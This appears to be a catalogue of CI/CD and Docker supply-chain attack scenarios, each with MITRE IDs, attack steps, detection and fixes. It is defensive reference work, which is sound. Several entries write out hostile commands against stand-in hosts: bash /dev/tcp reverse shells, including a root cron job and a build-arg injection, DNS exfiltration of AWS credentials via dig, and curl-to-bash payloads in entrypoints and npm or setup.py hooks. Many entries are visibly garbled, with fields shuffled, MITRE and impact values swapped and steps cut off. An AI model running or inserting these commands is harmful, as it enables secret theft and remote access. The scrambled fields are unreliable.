- **Attack Type**: Build Caching Abuse
- **Target**: Docker Build Pipeline
- **Vulnerability**: Cache retention of secrets
- **MITRE**: T1552
- **Impact**: Secret replay from CI build cache
- **Tools**: Docker BuildKit, GitHub Actions
- **Scenario**: Secrets passed as build args or env vars are leaked via Docker BuildKit caching mechanism.
- **Attack Steps**: 1. Developer uses --secret feature or sets secrets in ENV and expects them to stay safe.2. BuildKit caches the layers and saves secrets unintentionally due to misconfigured mounts.3. Attacker with access to CI runner or intermediate layers can retrieve secrets.4. BuildKit layer diffing shows credentials injected via ENV or mounted into /run/secrets/.5. Secrets are later replayed or reused to gain cloud control.6. This misconfiguration is stealthy and often overlooked in fast-moving CI/CD pipelines.
- **Detection**: Inspect BuildKit mounts and cache; secret diff tools
- **Solution**: Use ephemeral secrets, avoid persistent mounts, audit BuildKit config
- **Tags**: #buildkit #secretsleak #dockersecurity

## Reverse Shell via Compromised Dockerfile Template

- **Attack Type**: Malicious Build Injection
- **Target**: CI/CD Pipelines & Runtime Containers
- **Vulnerability**: Trusting 3rd-party Docker templates
- **MITRE**: T1059.004
- **Impact**: Remote shell access into production containers
- **Tools**: Docker, Netcat, bash, GitHub
- **Scenario**: A Dockerfile template shared in a popular open-source org is modified to include a reverse shell that activates at runtime in every container deployment.
- **Attack Steps**: 1. Attacker forks a GitHub repo that provides a “base” Dockerfile template for a popular Python framework.2. They add a line near the end of the Dockerfile: RUN bash -c 'bash -i >& /dev/tcp/attacker.example.com/9001 0>&1'.3. This line creates a reverse shell at runtime, quietly connecting to the attacker's server.4. The attacker submits a pull request or hosts the template on their own GitHub profile.5. Developers copy or reuse the Dockerfile without carefully inspecting every line.6. CI/CD systems build and deploy containers with this injected command.7. On first container launch, the connection to the attacker's listener is made, giving them shell access to container or runner.8. Since the shell runs within an app or service container, lateral movement or environment variable harvesting is possible.9. This can escalate further into host compromise or CI/CD pipeline tampering.10. Organizations may miss this during testing as the command is stealthy and buried in a trusted template.
- **Detection**: Outbound traffic logs, reverse shell signatures
- **Solution**: Audit all Dockerfiles, restrict internet access from build containers
- **Tags**: #reverseshell #dockerfile #templateattack

## Poisoned DockerHub Official-Lookalike Base Image

- **Attack Type**: Base Image Typosquatting
- **Target**: bash.<br>4. Unsuspecting developers mistake the fake image for the official one and write FROM ubuntu-base` in Dockerfiles.5. During builds, the spyware is embedded silently into containers.6. On runtime, this spyware exfiltrates environment variables, system info, and secrets to the attacker.7. The attacker rotates their collection domain dynamically to evade static blacklists.8. Developers may not realize the image is unofficial until reverse engineering the image or reviewing digests.9. The poisoned image spreads across dependent projects, affecting a large chain of deployments.10. The attacker now gains multi-tenant cloud insights or secrets at scale.
- **Vulnerability**: Build Systems Using Public Base Images
- **MITRE**: Image registry typosquatting
- **Impact**: T1195.002
- **Tools**: DockerHub, Python, curl
- **Scenario**: A base image named ubuntu-base is crafted to mimic official Ubuntu and includes spyware that activates on container start.
- **Attack Steps**: 1. Attacker builds an image named ubuntu-base and publishes it to DockerHub.2. They configure the metadata and description to look identical to the legitimate ubuntu base image.3. The image includes a startup script (entrypoint.sh) that runs `curl attacker[.]site/scrape.sh
- **Detection**: Supply chain compromise via impersonated base
- **Solution**: Digest mismatch, registry validation
- **Tags**: Pin images by SHA digest; whitelist trusted registry sources

## Malicious Multi-Stage Build That Re-injects Secrets

- **Attack Type**: Multi-Stage Abuse
- **Target**: CI/CD Pipelines Using Multi-Stage Builds
- **Vulnerability**: Misuse of build stages to retain secrets
- **MITRE**: T1552
- **Impact**: Inadvertent secret exposure in production containers
- **Tools**: Docker, BuildKit, curl
- **Scenario**: Secrets used in earlier build stages leak back into final image due to misconfigured multi-stage copying.
- **Attack Steps**: 1. A contributor submits a Dockerfile PR using multi-stage builds to optimize final image size.2. In Stage 1, secrets are used in environment variables to pull packages or build software.3. Stage 2 is supposed to copy only binaries into the final image, but attacker subtly modifies it to include /root/.aws or /home/user/.npmrc from Stage 1.4. These folders contain cloud access keys or registry tokens.5. Final image, though optimized, now includes the secrets that were only intended for use during build.6. CI/CD builds and deploys this image to production.7. Anyone pulling the image, even internally, can extract secrets using tools like dive or docker save.8. Attacker watches internal image registries or access logs for re-use opportunities.9. The leak may persist for weeks unnoticed if image scanning doesn’t include all intermediate stages.10. This leads to a quiet compromise of internal secrets and system trust boundaries.
- **Detection**: Scan for unexpected layer contents
- **Solution**: Enforce strict copy rules; do not reuse stages with secret access
- **Tags**: #multistage #dockerleak #buildsecrets

## GitHub Actions Cache Used for Secret Replay

- **Attack Type**: Cache Poisoning
- **Target**: GitHub Actions Workflows
- **Vulnerability**: Predictable cache key reuse
- **MITRE**: T1552.001
- **Impact**: Unauthorized secret access via cache replay
- **Tools**: GitHub Actions, curl, Trivy
- **Scenario**: An attacker uploads an artifact with sensitive tokens to GitHub cache and reuses it across builds.
- **Attack Steps**: 1. Attacker gains access to a repo’s CI/CD config or forks it.2. They craft a build job that uploads a file with fake tokens using actions/cache or upload-artifact.3. Cache key is predictable and used in other workflows.4. When the main pipeline runs, it reuses the poisoned cache, thinking it contains build artifacts.5. The secret is now available during build steps and used unknowingly by dependent jobs.6. The attacker triggers builds in public forks to gain visibility into whether secrets were consumed.7. If builds fail or log errors, they use log parsing to confirm the exploit.8. Attacker now knows what key was reused and which token was accessed.9. They proceed to exfiltrate further using curl/webhook payloads.10. Since the token was never explicitly injected, defenders may miss it.
- **Detection**: Audit GitHub cache keys, CI logs
- **Solution**: Avoid using shared cache keys for secrets; disable forks from accessing cache
- **Tags**: #githubactions #cacheabuse #secretleak

## Compromised Prebuilt Image in Internal Registry

- **Attack Type**: Internal Registry Poisoning
- **Target**: Internal Container Registry
- **Vulnerability**: Lack of image verification in trusted registries
- **MITRE**: T1609
- **Impact**: Full compromise via impersonated internal service
- **Tools**: Docker Registry, GCR, Harbor
- **Scenario**: Attacker uploads a compromised image to an organization’s internal registry by impersonating a trusted service name.
- **Attack Steps**: 1. The attacker, having limited access to an internal dev environment, discovers image pull permissions.2. They upload an image named service-a:latest, which appears to match the internal microservice naming convention.3. The image contains a rootkit or reverse shell, and passes health checks so it goes undetected.4. DevOps pipeline mistakenly pulls this latest tag image during CI/CD.5. The malicious container is deployed to staging or production.6. Attacker’s code activates on runtime, connecting to their listener.7. They use this entry to pivot across network or retrieve secrets from mounted volumes.8. The incident goes unnoticed until forensic comparison of image digests is performed.9. Trust in internal registries is violated, and all dependent services are suspect.10. Long-term compromise occurs if rollback doesn’t invalidate poisoned image.
- **Detection**: Registry audit, hash comparison
- **Solution**: Require image signing (cosign); pin digests only
- **Tags**: #internalregistry #servicemimic #cicdpoison

## Dependency Poisoning via .npmrc in Copied Repo

- **Attack Type**: Malicious .npmrc Abuse
- **Target**: GitHub Projects, npm-based Apps
- **Vulnerability**: Unvetted config files controlling dependency sources
- **MITRE**: T1195.002
- **Impact**: Software supply chain backdoor via dependencies
- **Tools**: GitHub, npm, curl, Docker
- **Scenario**: A cloned repo includes a hidden .npmrc file pointing to attacker’s package server.
- **Attack Steps**: 1. Attacker forks an open-source project and includes a .npmrc that sets registry=http://evil.npm.com.2. They submit PR or promote the forked version in developer forums.3. Developers clone the repo and unknowingly retain the .npmrc file.4. During CI/CD builds, dependencies are installed from the attacker’s server.5. Attacker injects modified versions of libraries that look like legit ones (e.g., axios, chalk).6. These packages include postinstall scripts to exfiltrate secrets or open backdoors.7. Containers or apps built with these dependencies are poisoned.8. Build logs look clean as registry is still accessible and functional.9. The attacker gets control of systems indirectly via libraries.10. This attack propagates if image reuse is enabled downstream.
- **Detection**: Analyze .npmrc, registry traffic logs
- **Solution**: Strip unverified configs; enforce allowed registries
- **Tags**: #npmrc #registryabuse #cicdsupplychain

## Piping Secrets into Build Logs via Debug Mode

- **Attack Type**: Log Exfiltration
- **Target**: GitHub Actions Logs
- **Vulnerability**: Verbose scripts leaking secrets
- **MITRE**: T1552.003
- **Impact**: Complete secret compromise from build logs
- **Tools**: GitHub Actions, bash, curl
- **Scenario**: Debug flags or verbose mode expose secrets into CI logs, which are accessible publicly or by forked PRs.
- **Attack Steps**: 1. Developer enables set -x in bash scripts for debugging build failures.2. During secret injection (e.g., export AWS_SECRET=$SECRET), the debug mode logs the exact value.3. Build logs are accessible to any user with access to PRs or CI logs.4. Attacker browses the Actions tab or uses API to dump logs from public forks.5. They find tokens, secrets, or credentials in plain text in these logs.6. Even after log deletion, artifacts may be stored in cache or externally indexed (e.g., by search engines).7. Attacker immediately uses keys to access cloud or internal resources.8. The blast radius includes environments with shared secrets or reused tokens.9. Organization may remain unaware until audit tools scan past logs.10. This technique works best on projects without log scrubbing or CI secrets masking.
- **Detection**: Regex scanning in logs, CI token masking
- **Solution**: Never use set -x in secrets sections; enable log redaction
- **Tags**: #cicdlogs #debugleak #tokenexposure

## Artifact Poisoning via Upload Tampering

- **Attack Type**: Build Artifact Backdoor
- **Target**: Internal Artifact Repositories
- **Vulnerability**: Insecure upload processes / no integrity checks
- **MITRE**: T1609
- **Impact**: Persistent backdoor across deployments
- **Tools**: JFrog, Maven, curl
- **Scenario**: Attacker uploads malicious artifact (e.g., .jar or binary) to artifact repo (e.g., JFrog), replacing legit file with backdoor.
- **Attack Steps**: 1. Attacker gets access to internal CI service account or staging environment.2. They tamper with artifact upload logic to replace app.jar with app-backdoor.jar just before publish.3. The artifact still functions, but includes embedded shell that listens on high port.4. The poisoned jar is uploaded to Artifactory and used in production builds.5. When invoked, the artifact opens connection to attacker’s server.6. Devs and users see no breakage, and tests still pass.7. The attacker can trigger additional payloads with hidden commands or config toggles.8. The compromise stays hidden for weeks unless hash checks or reproducible builds are used.9. This may affect hundreds of builds if the artifact is widely reused.10. Supply chain is now tainted and rollback is non-trivial.
- **Detection**: Artifact diffing, reproducible builds
- **Solution**: Enforce signed artifacts, check hashes pre-deploy
- **Tags**: #artifactpoison #jarbackdoor #ciabuse

## Curl Execution via Base Image Entrypoint

- **Attack Type**: Entrypoint Exploitation
- **Target**: bash.<br>2. The image otherwise looks and functions like the official Node image.<br>3. Developers use this image to speed up builds (FROM node-fast:latest`).4. During deployment, the script fetched by curl is executed, giving attacker runtime control.5. They can dynamically change the payload over time.6. DevOps doesn’t suspect issue as logs only show app startup.7. Attacker monitors calls to their domain and rotates IPs.8. Each restart of container re-executes attacker’s live code.9. The attack may spread to other dependent apps if reused.10. Without scanning entrypoint or checking digest, detection is rare.
- **Vulnerability**: Docker Base Images
- **MITRE**: Entrypoint script calling remote code
- **Impact**: T1059.006
- **Tools**: Docker, bash, curl, DockerHub
- **Scenario**: A base image’s entrypoint silently runs curl to download malicious scripts at container launch.
- **Attack Steps**: 1. Attacker publishes a modified Node.js base image that contains an entrypoint calling `curl attacker.site/live.sh
- **Detection**: Remote command execution at runtime
- **Solution**: Inspect entrypoint scripts, DNS logs
- **Tags**: Use official images only; validate image digests

## Exfiltration via DNS Queries in Build Tools

- **Attack Type**: DNS-Based Covert Channel
- **Target**: CI/CD Shell Scripts
- **Vulnerability**: DNS exfiltration via command-line tools
- **MITRE**: T1048.003
- **Impact**: Silent secret theft via DNS channel
- **Tools**: dig, nslookup, bind9
- **Scenario**: Malicious build script encodes and sends secrets via DNS queries to attacker’s domain.
- **Attack Steps**: 1. Attacker inserts dig $(cat ~/.aws/credentials).attacker.com in build scripts.2. When the CI/CD runs the script, it makes DNS lookups embedding secrets.3. Attacker controls attacker.com and logs DNS queries at their nameserver.4. Each secret (e.g., AWS key) becomes part of subdomain and reaches attacker.5. Since this is just DNS, most firewalls don’t alert or block it.6. No HTTPS or curl is involved, evading egress filters.7. If the build is public or accessible by forked repos, attack can repeat.8. Secrets rotate slowly in orgs, so attacker can exploit over time.9. Organizations may never correlate DNS logs with exfil unless heavily monitored.10. This is a low-noise, high-impact attack path often ignored.
- **Detection**: DNS logs, entropy-based detection
- **Solution**: Strip secrets from builds; block DNS from CI runners
- **Tags**: #dnsexfil #secretleak #buildabuse

## Hijacking CI with Malicious GitHub Actions from Dependency

- **Attack Type**: Dependency Workflow Injection
- **Target**: bash.<br>3. They ensure functionality remains unchanged so users don’t suspect anything.<br>4. The new version is tagged as v1.2.3, and users referencing the @latest` tag in their workflow auto-pull it.5. Any repo using this Action now executes attacker’s payload during its CI run.6. The payload can be a reverse shell, token stealer, or CI runner backdoor.7. Attacker monitors logs for victim IPs and builds.8. Even private repos that reference the action unknowingly execute the attack.9. Developers rarely audit third-party GitHub Actions deeply.10. The attacker leverages trust in OSS to establish a long-term CI compromise across orgs.
- **Vulnerability**: GitHub Actions Workflows
- **MITRE**: Trusting mutable third-party GitHub Action references
- **Impact**: T1195.002
- **Tools**: GitHub Actions, Python, Git
- **Scenario**: A popular third-party GitHub Action dependency is modified to execute attacker’s payload in all projects that use it.
- **Attack Steps**: 1. Attacker forks or gains contributor access to a widely used GitHub Action (e.g., for Python linting or Docker tagging).2. They insert a line in entrypoint.sh or the main action logic that performs: `curl attacker.site/payload.sh
- **Detection**: Multi-project compromise via poisoned Action
- **Solution**: Review Actions call graphs, pin to hash
- **Tags**: Pin GitHub Actions by SHA, audit 3rd party code

## Supply Chain Attack via Image Auto-Update Tags

- **Attack Type**: Registry Tag Abuse
- **Target**: CI/CD Pipelines Pulling Public Images
- **Vulnerability**: Lack of digest pinning for auto-updated tags
- **MITRE**: T1609
- **Impact**: Auto-compromise through routine CI rebuilds
- **Tools**: DockerHub, Docker CLI, bash
- **Scenario**: Attacker updates their :latest tag on DockerHub to a backdoored version — builds auto-pull this during CI/CD without version pinning.
- **Attack Steps**: 1. DevOps team configures CI to use FROM mycompany/node-service:latest without digest pinning.2. The :latest tag is controlled by an attacker who maintains a public image repo.3. Initially, it’s clean and useful, building trust.4. After adoption, attacker pushes new version that includes malware in CMD or as startup script.5. CI pipelines that rebuild daily or per-commit now unknowingly fetch the poisoned image.6. The containers run as usual, but include shell or data exfiltration to attacker’s domain.7. Attack spreads across microservices relying on same image tag.8. Detection is difficult because hash and size changes are expected between builds.9. Reverse engineering the layer requires suspicion and time.10. Auto-updating images without locking by SHA enables this.
- **Detection**: Image diffing tools, hash drift detection
- **Solution**: Always use image SHA digests, not :latest
- **Tags**: #docker #imagepoison #autopullabuse

## Embedded Secrets in .env Files Left in Final Image

- **Attack Type**: Secrets Exposure
- **Target**: Docker Images in Registry
- **Vulnerability**: Ignored sensitive files included in build context
- **MITRE**: T1552
- **Impact**: Secrets leak via image layer analysis
- **Tools**: Docker, Trivy, Dive
- **Scenario**: Environment config files (.env) are mistakenly copied into final Docker image layers, exposing credentials to anyone with access.
- **Attack Steps**: 1. Developer adds .env file locally to configure AWS keys, DB credentials, and API tokens.2. During Docker build, COPY . . is used — including .env file in image context.3. The .dockerignore file doesn't exclude .env.4. Final image is pushed to internal or public registry.5. Any attacker with access to the image (via DockerHub or registry compromise) runs docker save or uses tools like Dive to extract the .env file.6. From the secrets, attacker accesses production DBs, S3 buckets, or APIs.7. Dev team is unaware until alert triggered from suspicious usage.8. Even if image is later patched, earlier versions may still exist in CI/CD or caches.9. Long-term access can persist due to secret reuse.10. This remains one of the most common supply chain oversights.
- **Detection**: Trivy, secrets scanners, image diff tools
- **Solution**: Enforce .dockerignore, rotate leaked secrets
- **Tags**: #dockerfile #envleak #buildcontext

## Poisoned Docker Compose File in Forked Repo

- **Attack Type**: Docker Compose Abuse
- **Target**: nc attacker.site 9999; sleep 60; done'<br>3. The service is marked as depends_onanother legit service, so it launches without suspicion.<br>4. Developers clone the repo and use thedocker-compose up` command.5. During local or CI-based builds, the malicious container launches and silently exfiltrates environment variables or mounted secrets.6. Since it runs alongside legit services and doesn't fail health checks, it's often ignored.7. If deployed in a cloud host, attacker gains recurring access.8. Lateral movement possible if networked.9. Security tools rarely parse custom services in docker-compose unless flagged.10. Attackers use this for persistence or recon.
- **Vulnerability**: Docker Compose Deployments
- **MITRE**: Hidden services in compose YAML files
- **Impact**: T1071.001
- **Tools**: Docker Compose, GitHub
- **Scenario**: Malicious service in docker-compose.yml executes background data exfiltration script without breaking primary service.
- **Attack Steps**: 1. Attacker forks a GitHub repo containing docker-compose.yml for app deployment.2. They inject an extra service like spy-service in the YAML:image: alpine:latest`command: sh -c 'while true; do cat /env
- **Detection**: Stealthy data exfiltration via auxiliary service
- **Solution**: Manual YAML audits, runtime service monitoring
- **Tags**: Restrict compose usage to audited files only

## Tricking CI/CD with Malicious .dockerignore

- **Attack Type**: Build Context Subversion
- **Target**: CI/CD Docker Builds
- **Vulnerability**: Exploiting CI config via ignored paths
- **MITRE**: T1609
- **Impact**: CI bypass leading to trusted artifact compromise
- **Tools**: Git, Docker, bash
- **Scenario**: .dockerignore excludes security scan tools and test scripts, letting attacker push vulnerable or malicious code.
- **Attack Steps**: 1. Attacker submits PR with updated .dockerignore that excludes key files: tests/, security/, scanner.sh.2. During build, CI ignores these files and builds passes since tests and scanners are excluded.3. This allows vulnerable or malicious code to get merged without checks.4. Final Docker image is created with backdoored binary.5. Build logs appear clean, with no test failures or scan alerts.6. Attacker uses code that activates on runtime via ENTRYPOINT.7. Devs believe changes are clean because all tests "pass".8. Security scanners don’t catch issues due to excluded context.9. Attacker monitors system for remote access or leaks.10. This technique is easy to miss in large mono-repos.
- **Detection**: Review of ignore files and change diffs
- **Solution**: Enforce scan on full source, not build context only
- **Tags**: #dockerignore #cibypass #contextattack

## Exploiting GitHub Secrets Exposure via PR Logs

- **Attack Type**: Token Leak via Forked Builds
- **Target**: GitHub Actions
- **Vulnerability**: Fork PR misuse to leak CI secrets
- **MITRE**: T1552.003
- **Impact**: Full CI secret leak via public logs
- **Tools**: GitHub Actions
- **Scenario**: Forked repo triggers CI job that prints masked secrets into logs due to echo $SECRET in workflow.
- **Attack Steps**: 1. Developer sets up GitHub Actions and stores secrets under Settings > Secrets.2. Forked PR triggers Actions job (due to pull_request trigger).3. The workflow file contains run: echo $MY_SECRET.4. GitHub masks secrets (e.g., with ***), but in some cases attackers bypass this by manipulating string — e.g., using echo ${MY_SECRET:0:1}.5. Each character is exfiltrated one at a time, via logs or encoded URLs.6. Attacker uses the logs tab in PR to extract full value character by character.7. Alternatively, secrets used in URLs or headers (curl -H "Auth: $SECRET") leak partially.8. PR logs are public or visible to attacker.9. Organization remains unaware unless alerts trigger.10. Attacker now has credentials for cloud, APIs, or internal services.
- **Detection**: Secrets detection bots, log analysis
- **Solution**: Disable secrets in forked PRs; rotate exposed tokens
- **Tags**: #githubsecrets #cileak #prlogs

## Injecting Reverse Shell via Build ARG Variable

- **Attack Type**: Build ARG Exploitation
- **Target**: CI/CD Docker Builds
- **Vulnerability**: Unsafe use of dynamic build args
- **MITRE**: T1059.004
- **Impact**: Remote code exec in CI pipeline
- **Tools**: Docker, GitHub Actions
- **Scenario**: Malicious --build-arg injected into Docker build via manipulated CI job triggers remote shell.
- **Attack Steps**: 1. Dockerfile uses build arg: ARG CMD=echo Hello and RUN $CMD.2. Attacker forks repo or modifies workflow to pass: --build-arg CMD="bash -i >& /dev/tcp/attacker.site/443 0>&1"3. The Docker build executes attacker’s command during image creation.4. Reverse shell connects back to attacker's listener.5. Once CI runner is compromised, attacker can inspect env, secrets, or move laterally.6. Since ARGs aren't secrets, they’re not masked in logs.7. Detection is hard unless command output is closely monitored.8. Build completes successfully, hiding the shell launch.9. The attack is portable across runners.10. This shows how overlooked Docker ARGs can be abused.
- **Detection**: Monitor build ARGs, validate command templates
- **Solution**: Avoid unvalidated ARG usage, sanitize inputs
- **Tags**: #buildarg #dockerattack #remoteshell

## Supply Chain Attack via Fake Git Submodule

- **Attack Type**: Submodule Substitution
- **Target**: Git Submodules in CI Pipelines
- **Vulnerability**: Using external repo as trusted submodule
- **MITRE**: T1195.002
- **Impact**: Full CI compromise via shell script execution
- **Tools**: Git, GitHub, bash
- **Scenario**: Repo submodule points to attacker-controlled repo hosting malicious scripts.
- **Attack Steps**: 1. Dev adds a git submodule pointing to a repo for build scripts: git submodule add https://github.com/attacker/tools ./tools.2. Attacker owns that repo and modifies build.sh to inject malware.3. CI/CD runs ./tools/build.sh during builds.4. The script downloads additional payloads, steals secrets, or opens shell.5. Since submodules are pulled during git clone --recursive, they’re rarely reviewed.6. Commit hashes don’t always protect you — attacker can reset commits on their repo.7. Devs using this submodule unknowingly fetch and execute malicious content.8. Even private forks of the repo are affected.9. Detection only occurs if someone audits the external submodule origin.10. The entire CI pipeline becomes tainted from external dependency.
- **Detection**: Audit of submodule URLs and commit pins
- **Solution**: Use internal trusted submodules, pin by hash
- **Tags**: #gitattack #submoduleabuse #cicdtaint

## Package Install Hook Leads to Code Execution

- **Attack Type**: npm Postinstall Exploit
- **Target**: bash" }<br>3. During Docker build, npm install` executes this postinstall script.4. CI/CD system silently downloads and runs the attacker’s payload.5. The script collects environment variables, GitHub tokens, and posts them back.6. Devs aren’t aware because install logs don’t flag postinstall unless verbose.7. This also happens if package is a transitive dependency.8. Even in air-gapped CI, attackers use this to establish internal pivot.9. Long-term backdoor possible if script installs cronjob or systemd service.10. This is a common method in OSS abuse.
- **Vulnerability**: Node-based Docker Builds
- **MITRE**: Abuse of install hooks in packages
- **Impact**: T1059.006
- **Tools**: npm, Docker, bash
- **Scenario**: A library with postinstall hook executes a payload during npm install inside Docker build.
- **Attack Steps**: 1. Attacker publishes a package color-convertor to npm registry with useful functionality.2. In package.json, they define:`"scripts": { "postinstall": "curl attacker.site/run.sh
- **Detection**: Code execution during dependency install
- **Solution**: Package audit, install hook scanning
- **Tags**: Disable lifecycle scripts in CI, audit all packages

## Secret Leak via --build-arg Echo in Dockerfile

- **Attack Type**: Docker ARG Logging Leak
- **Target**: Dockerfile in CI/CD
- **Vulnerability**: Logging secrets via RUN echo
- **MITRE**: T1552.003
- **Impact**: Full token exposure to log scrapers
- **Tools**: Docker, GitHub Actions
- **Scenario**: Dockerfile uses ARG SECRET_KEY then RUN echo $SECRET_KEY, unintentionally logging secret in CI logs.
- **Attack Steps**: 1. Dockerfile includes: ARG SECRET_KEY and RUN echo $SECRET_KEY for debugging.2. In CI, a secret value is passed via --build-arg SECRET_KEY=$ACTUAL_SECRET.3. During build, CI logs contain: Step 3/5 : RUN echo $SECRET_KEY followed by full secret in plain text.4. Logs are publicly viewable in PRs or Actions tab.5. Attacker scrapes logs using GitHub API or via PRs.6. With secret exposed, they access cloud APIs or other services.7. Secret rotation is not triggered unless someone reviews logs.8. The echo line is often left during test/debug and forgotten.9. Attacker may chain this with further privilege escalation.10. It highlights risks of unmasked secrets in build outputs.
- **Detection**: Secret scanning bots, CI log reviews
- **Solution**: Never echo secrets; redact build logs
- **Tags**: #dockerarg #logleak #tokenexposure

## Supply Chain Poisoning via requirements.txt Dependency

- **Attack Type**: Python Dependency Injection
- **Target**: Docker + Python CI Builds
- **Vulnerability**: Dependency typosquatting in CI config
- **MITRE**: T1195.002
- **Impact**: Full compromise of CI output via dependency
- **Tools**: GitHub, PyPI, Python, pip
- **Scenario**: Attacker sneaks malicious package into requirements.txt of open-source project, triggering remote code during build
- **Attack Steps**: 1. An attacker forks a public GitHub repo that builds Docker containers with Python apps.2. They modify requirements.txt to add a dependency such as urllibx==1.0.0, which mimics the name of a trusted library (urllib3).3. The malicious package is published to PyPI.4. During Docker build in CI, the pip install step downloads and executes malicious setup.py.5. The attacker uses setup.py to initiate a reverse shell or drop a persistent backdoor.6. Since the library name looks similar, the change may go unnoticed in PR reviews.7. If approved and merged, the poisoned Docker image is pushed to production registry.8. Anyone using this image now inherits the attacker’s backdoor.9. The attacker can monitor or access hundreds of production environments.10. This exploit demonstrates how a simple dependency typo can poison entire CI pipelines.
- **Detection**: Dependency diffing, typo scanners
- **Solution**: Lock dependency hashes, use SCA scanners
- **Tags**: #pip #supplychain #typosquat

## Reverse Shell in Entrypoint of Shared Docker Image

- **Attack Type**: Entrypoint Backdoor
- **Target**: Internal Docker Registry
- **Vulnerability**: Malicious startup scripts in base images
- **MITRE**: T1059.004
- **Impact**: Remote container access in prod CI runs
- **Tools**: Docker, bash, netcat
- **Scenario**: Entrypoint in a shared internal Docker image includes reverse shell payload
- **Attack Steps**: 1. A shared base image used across teams contains an entrypoint script (entrypoint.sh).2. An attacker with access to the base image repo modifies the script to include:bash -i >& /dev/tcp/attacker.site/443 0>&1 &.3. They re-tag the image as internal-tools-base:v1.5 and push it to the private registry.4. Several teams’ CI/CD pipelines pull this updated image automatically due to tag.5. During container start, the reverse shell executes silently in background.6. Attacker gets shell access to each running container across environments.7. CI/CD jobs that build on this image are now poisoned.8. Attacker uses these shells to move laterally, harvest secrets, or escalate.9. Detection is hard due to expected traffic from containers.10. This showcases the need for entrypoint audits and immutability.
- **Detection**: Container behavior monitoring, entrypoint diff
- **Solution**: Sign and lock base image entrypoints
- **Tags**: #entrypoint #dockerbase #shellinjection

## Poisoned GitHub Template Repositories

- **Attack Type**: Template Repo Abuse
- **Target**: bash`.4. Developers trust the clean design and copy the template as-is.5. CI/CD pipelines run as soon as developers push their commits.6. The malicious job executes every CI run, sending host data or secrets to attacker.7. Detection is hard if script is obfuscated or disguised as telemetry.8. Since it's "their" repo now, many skip auditing the initial template.9. Lateral spread possible if image registry or secrets are shared.10. The attacker can track adoption via GitHub API and mass-exploit.
- **Vulnerability**: GitHub Starter Templates
- **MITRE**: Blind trust in prebuilt template repos
- **Impact**: T1553
- **Tools**: GitHub, Actions, bash
- **Scenario**: GitHub template repos are used as starter CI/CD pipelines and poisoned by malicious actors
- **Attack Steps**: 1. GitHub allows repos to be marked as "template" — used by devs to bootstrap CI.2. Attacker creates a template with working workflows, Dockerfile, and Compose setup.3. Inside .github/workflows/deploy.yml, attacker adds a step: `curl attacker.site/run.sh
- **Detection**: Mass compromise via template reuse
- **Solution**: Audit initial commit of forked/template repos
- **Tags**: Build templates internally; audit third-party use

## Registry Supply Chain Attack via Dependency Pinning Override

- **Attack Type**: Registry Metadata Tamper
- **Target**: CI/CD Docker Pulls
- **Vulnerability**: Trusting tag without digest validation
- **MITRE**: T1609
- **Impact**: Root compromise in base OS across org
- **Tools**: Docker Registry, Notary, curl
- **Scenario**: Attacker uploads fake images with matching tags to private registry mirrors
- **Attack Steps**: 1. Company uses registry mirror with custom DNS like docker.registry.local.2. Image tags like ubuntu:18.04 are cached locally for speed.3. Attacker gets access to registry system (e.g., DevOps, DNS poisoning) and uploads image with same tag, but malicious content.4. Next CI run pulls ubuntu:18.04, but from tampered registry.5. The malicious image has altered /etc/profile to initiate callback.6. Since tag appears trusted, nobody checks image digest or integrity.7. The compromise is subtle — even Ops logs appear normal.8. If Notary or content trust isn't enforced, there’s no protection.9. The attacker can persist across rebuilds silently.10. This is a silent yet devastating supply chain vector.
- **Detection**: Monitor image SHA drift, enable Docker content trust
- **Solution**: Pin digests and enforce signature verification
- **Tags**: #registryattack #dockertrust #imagename

## Secrets Captured via Intermediate Build Layers

- **Attack Type**: Layer Artifact Leak
- **Target**: bashin Dockerfile.<br>2. Even if final image doesn’t use this layer, the intermediate layer contains the full secret.<br>3. If build cache or intermediate images are accessible (e.g., GitHub cache, CI cache), attackers can inspect layers withdocker history.<br>4. They extract secrets using diveorctr images mount`.5. The exposed secret might allow Git access, cloud storage, or APIs.6. Intermediate layers are often cached in cloud registries.7. Even removing lines later won’t remove history unless image is rebuilt from scratch.8. This attack survives cleanup and impacts long-term secrets.9. Developers are unaware since secrets never make it to final container.10. CI/CD runners must ensure secrets are handled externally.
- **Vulnerability**: Docker Layer Caching
- **MITRE**: Secrets in layer history/cache
- **Impact**: T1552.004
- **Tools**: Docker, buildkit, Trivy
- **Scenario**: Intermediate Docker layers include secrets used for download or script execution
- **Attack Steps**: 1. Developer includes `RUN export TOKEN=xyz && curl -H "Auth: $TOKEN" file.sh
- **Detection**: Cloud/API secret leak from CI builds
- **Solution**: Trivy, Dive, layer history analysis
- **Tags**: Use multi-stage builds, keep secrets out of build context

## GitHub Actions Abuse via Self-Hosted Runner Write Access

- **Attack Type**: Runner Privilege Abuse
- **Target**: GitHub Self-Hosted Runners
- **Vulnerability**: Misuse of persistent filesystem
- **MITRE**: T1078.001
- **Impact**: Persistent access to CI infra and cloud
- **Tools**: GitHub Actions, SSH, cron
- **Scenario**: Attacker adds malicious workflow targeting self-hosted runners with broader system access
- **Attack Steps**: 1. Company uses self-hosted runners (e.g., on EC2, internal VMs) with broader privileges.2. Attacker submits PR containing .github/workflows/pwn.yml.3. The job writes a cron job to /etc/cron.d/rev:* * * * * root bash -i >& /dev/tcp/attacker.site/1234 0>&1.4. The CI pipeline runs the PR job due to misconfigured pull_request trigger.5. Since self-hosted runners are reused across jobs, the malicious cron persists.6. Attacker regains access periodically.7. Detection is difficult unless job output is closely monitored.8. The attacker uses persistence to scrape secrets or pivot into cloud.9. Organizations using shared runners are at risk.10. This is a real-world example of lateral movement via CI runners.
- **Detection**: Monitor workflow changes, runner behavior
- **Solution**: Use ephemeral runners, review cron access
- **Tags**: #runnerabuse #githubactions #persistencerisk

## Reverse Shell via setup.py in Python Package from CI Build

- **Attack Type**: Malicious Package Execution
- **Target**: bash").<br>3. During pip install, setup.pyis executed automatically.<br>4. The attacker’s reverse shell runs in CI context.<br>5. Attacker collects CI environment variables, tokens, or uses open sockets.<br>6. Sincesetup.pyis seen as metadata, few auditors review it.<br>7. Transitive dependencies often go unaudited.<br>8. A variation includes usinginit.py to execute at import.<br>9. Malicious packages often mimic real ones (helper, utils`), enhancing trust.10. The attacker now owns the build and possibly its artifacts.
- **Vulnerability**: Python CI/CD Pipelines
- **MITRE**: Execution via Python packaging hooks
- **Impact**: T1059.006
- **Tools**: PyPI, Python, pip
- **Scenario**: Attacker embeds backdoor in setup.py of fake dependency installed during CI
- **Attack Steps**: 1. Developer adds py-helper package to dependencies.2. The package contains a malicious setup.py that executes:`os.system("curl attacker.site/rs.sh
